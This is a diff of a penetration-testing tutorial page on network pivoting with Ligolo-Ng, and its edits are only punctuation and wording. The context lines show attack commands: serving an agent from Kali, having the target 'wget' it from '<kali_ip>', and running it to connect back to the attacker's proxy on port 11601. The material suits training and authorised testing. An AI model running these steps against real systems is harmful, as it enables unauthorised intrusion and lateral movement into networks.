@@ -32,7 +32,7 @@ sudo chmod +x agent
 ```
 
 # Basic Pivot
-Move the agent file into the pivot host
+Move the agent file into the pivot host:
 ```shell
 # On Kali
 sudo cp /home/kali/Downloads/ligolo-ng_agent_0.7.2_linux_amd64/agent .
@@ -40,7 +40,7 @@ python3 -m http.server 443
 # On Target
 wget http://<kali_ip>:443/agent
 ```
-Set up Ligolo-Ng on Kali
+Set up Ligolo-Ng on Kali:
 ```shell
 # Create an interface
 sudo ip tuntap add user Vorkharium mode tun ligolo
@@ -54,13 +54,13 @@ sudo chmod +x proxy
 # The Ligolo-Ng console will now open (We will interact with it soon)
 ```
 
-On the Pivot target, use the agent file to connect
+On the Pivot target, use the agent file to connect to our running proxy:
 ```shell
 chmod +x agent
 ./agent --connect <kali_ip>:11601 -ignore-cert
 ```
 
-Now enter the following in the Ligolo-Ng console
+Now enter the following on the Ligolo-Ng console:
 ```shell
 # Enter "session" to show the available sessions
 ligolo-ng » session
